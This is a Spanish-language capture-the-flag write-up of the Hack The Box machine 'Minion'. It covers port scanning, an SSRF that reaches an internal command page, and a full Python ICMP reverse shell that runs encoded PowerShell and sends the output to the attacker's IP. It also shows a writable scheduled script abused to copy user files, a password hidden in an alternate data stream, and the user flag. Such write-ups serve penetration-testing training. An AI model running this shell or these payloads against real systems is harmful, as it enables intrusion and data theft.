---
layout: post
title: Minion
date: 2023-04-01
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Minion-htb/Minion.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.57 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-01 14:54 GMT
Nmap scan report for 10.10.10.57
Host is up (0.31s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
62696/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 28.51 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p62696 10.10.10.57 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-01 14:55 GMT
Nmap scan report for 10.10.10.57
Host is up (0.048s latency).

PORT      STATE SERVICE VERSION
62696/tcp open  http    Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/backend
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.53 seconds
```

## Puerto 62696 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.10.57:62696
http://10.10.10.57:62696 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[10.10.10.57], Microsoft-IIS[8.5], X-Powered-By[ASP.NET]
```

La página principal se ve así:

<img src="/writeups/assets/img/Minion-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.10.57:62696/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 300 --no-error -x asp,aspx
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.57:62696/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/04/01 18:41:13 Starting gobuster in directory enumeration mode
===============================================================
/test.asp             (Status: 200) [Size: 41]
/backend              (Status: 301) [Size: 156] [--> http://10.10.10.57:62696/backend/]
```

Al ```test.asp``` hay que pasarle un parámetro

```null
curl -s -X GET http://10.10.10.57:62696/test.asp
Missing Parameter Url [u] in GET request!
```

Es vulnerable a SSRF

```null
curl -s -X GET 'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80'
<html>
<body>
<center>
<h1>Site Administration</h1>
<table border=1>
<tr><td><a href="">Edit Configuration</a>
<tr><td><a href="">Start/Stop Instance</a>
<tr><td><a href="">View Summary</a>
<tr><td><a href="">View Logs</a>
<tr><td><a href="http://127.0.0.1/cmd.aspx">system commands</a>
</table>
</body>
</html>
```

Tengo acceso a un formulario para ejecutar comandos

<img src="/writeups/assets/img/Minion-htb/2.png" alt="">

Como estoy abusando del SSRF, no es tan sencillo como enviar los datos directamente, ya que me redirigiría a la página web del puerto 62696. Pero puedo cambiar el método de POST a GET

```null
GET /test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=ping+-n+1+10.10.16.2 HTTP/1.1
Host: 10.10.10.57:62696
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.57:62696
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: ASPSESSIONIDACQATCSS=KKEFGNDAILAGBCHAIPEDLOFN
Connection: close
```

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:03:01.964837 IP 10.10.10.57 > 10.10.16.2: ICMP echo request, id 1, seq 1, length 40
19:03:01.965043 IP 10.10.16.2 > 10.10.10.57: ICMP echo reply, id 1, seq 1, length 40
```

Hay reglas de Firewall implimentadas, por lo que la única forma de enviarme una reverse shell es a través de trazas de ICMP. Pero al intentar enviar el ```Invoke-PowerShellICMP.ps1``` recibo un error, ya que es demasiado grande. Lo deposito de varias veces en un archivo. Utilizaré un script desarrolado por [0xdf](https://www.youtube.com/watch?v=itMImlUZP0E)

{%raw%}
```null
#!/usr/bin/env python3

import base64
import requests
import threading
from cmd import Cmd
from scapy.all import *
from urllib.parse import quote


class Term(Cmd):

    prompt = "[~] - "
    cmd_payload = """$cmd = '{cmd}'; $step=1000; $ping = New-Object System.Net.NetworkInformation.Ping; $opts = New-Object System.Net.NetworkInformation.PingOptions; $opts.DontFragment = $true; $res=(iex -command $cmd|out-string); $data = [System.Text.Encoding]::ASCII.GetBytes($res); $i=0; while($i -lt $data.length){{$ping.send('10.10.16.2', 5000, $data[$i..($i+$step)], $opts); $i=$i+$step}}"""


    def __init__(self):
        super().__init__()
        thread = threading.Thread(target=self.listen_thread, args=())
        thread.daemon = True
        thread.start()


    def listen_thread(self):
        sniff(filter="icmp and src 10.10.10.57", iface="tun0", prn=self.handle_icmp)


    def handle_icmp(self, pkt):
        print(pkt[Raw].load.decode(), end="")
        sys.stdout.flush()


    def default(self, args):
        cmd = self.cmd_payload.format(cmd=args)
        enccmd = quote(quote(base64.b64encode(cmd.encode('utf-16le')).decode()))
        requests.get(f'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=powershell+-enc+{enccmd}')


term = Term()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()
```
{%endraw%}

```null
python3 icmp_shell.py
[~] - whoami
iis apppool\defaultapppool
[~] - ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::f8
   IPv6 Address. . . . . . . . . . . : dead:beef::c2a:1819:d5ad:d7b9
   Link-local IPv6 Address . . . . . : fe80::c2a:1819:d5ad:d7b9%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.57
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f488%11
                                       10.10.10.2

Tunnel adapter isatap.{EC2B3AE5-2839-4250-8874-9AEC667A59EE}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : htb
```

En la raíz hay un directorio ```sysadmscripts```

```null
[~] - dir C:\sysadmscripts


    Directory: C:\sysadmscripts


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         9/26/2017   6:24 AM        284 c.ps1                             
-a---         8/22/2017  10:46 AM        263 del_logs.bat
```

Miro su contenido

```null
[~] - type C:\sysadmscripts\c.ps1
$lifeTime=1; # days

foreach($arg in $args)
{
    write-host $arg

    dir $arg | where {!$_.psiscontainer} | foreach
    {
        if((get-date).subtract($_.LastWriteTime).Days -gt $lifeTime)
        {
            remove-item ($arg + '\' + $_) -force
        }
    }
}
```

```null
[~] - type C:\sysadmscripts\del_logs.bat
@echo off
echo %DATE% %TIME% start job >> c:\windows\temp\log.txt
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -exec bypass -nop -file c:\sysadmscripts\c.ps1 c:\accesslogs 
```

Tengo privilegios totales sobre ```c.ps1```

```null
[~] - icacls C:\sysadmscripts\*
C:\sysadmscripts\c.ps1 NT AUTHORITY\SYSTEM:(F)
                       BUILTIN\Administrators:(F)
                       Everyone:(F)
                       BUILTIN\Users:(F)

C:\sysadmscripts\del_logs.bat NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              Everyone:(RX)
                              BUILTIN\Users:(RX)

Successfully processed 2 files; Failed processing 0 files
```

Suponiendo que hay una tarea que lo ejecuta en intervalos regulares de tiempo, copio todo el escritorio del directorio personal del usuario ```decoder``` al directorio ```Temp```

```null
[~] - echo "copy C:\Users\decoder.MINION\Desktop\* C:\Temp" >> C:\sysadmscripts\c.ps1
```

```null
[~] - dir C:\Temp\


    Directory: C:\Temp


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          9/4/2017   7:19 PM     103297 backup.zip                        
-a---         8/25/2017  11:09 AM         33 user.txt  
```

Puedo ver la primera flag

```null
[~] - type C:\Temp\user.txt
40b949f92b86b19a77986af9faf91601
```

# Escalada

El ```backup.zip``` tiene una Alternative Data String

```null
[~] - cmd /c dir /r C:\Temp\
 Volume in drive C has no label.
 Volume Serial Number is A339-1583

 Directory of C:\Temp

04/02/2023  02:56 AM    <DIR>          .
04/02/2023  02:56 AM    <DIR>          ..
09/04/2017  07:19 PM           103,297 backup.zip
                                    34 backup.zip:pass:$DATA
08/25/2017  11:09 AM                33 user.txt
               2 File(s)        103,330 bytes
               2 Dir(s)   4,505,051,136 bytes free
```

La leo

```null
[~] - type C:\Temp\backup.zip:pass
28a5d1e0c15af9f8fce7db65d75bbf17
```

La contraseña es ```1234test```

<img src="/writeups/assets/img/Minion-htb/3.png" alt="">

Corresponde a la del usuario Administrador. Con el uso de ScriptBlocks puedo ver la segunda flag